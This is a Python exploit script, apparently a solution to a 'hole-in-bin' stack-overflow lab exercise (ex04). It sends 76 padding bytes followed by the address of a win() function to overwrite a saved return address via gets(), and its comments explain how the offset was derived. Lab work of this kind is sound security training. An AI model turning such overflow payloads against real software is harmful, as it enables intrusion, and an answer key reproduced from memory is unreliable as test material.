#!/usr/bin/env python3
"""
ex04 exploit  (stack4: overwrite the saved RETURN ADDRESS).

main():
    sub  esp, 0x50
    gets(buffer=[esp+0x10])          <- unbounded, no variable/fp to hijack
    leave ; ret                      <- we overwrite the saved EIP that `ret` pops
win() @ 0x080483f4 -> puts("code flow successfully changed")

Unlike ex03 there is no function pointer in the frame — the only code pointer
we can reach is the function's own saved return address. Overwrite it with &win.

Offset buffer -> saved return address = 76 bytes (0x4c). Derivation:
  ret addr sits at [ebp+4]; buffer at (aligned_esp)+0x10. With the 16-byte
  `and esp,0xfffffff0` alignment in this environment the gap is 76, confirmed
  dynamically (a 4-byte marker at offset 76 lands exactly in EIP — verified via
  the kernel segfault log: "ip 0000000042424242").

Usage (VM):   python3 ex04.py | /opt/hole-in-bin/ex04/bin
Local:        python3 scripts/ex04.py | scripts/runlocal.sh challenges/ex04/bin
(When piped, stdout is block-buffered; win() runs and prints, but the post-win
 crash can swallow the unflushed line. On a terminal / in the VM it shows.)
"""
import struct
import sys

OFFSET = 76
WIN = 0x080483f4
payload = b"A" * OFFSET + struct.pack("<I", WIN)
sys.stdout.buffer.write(payload)
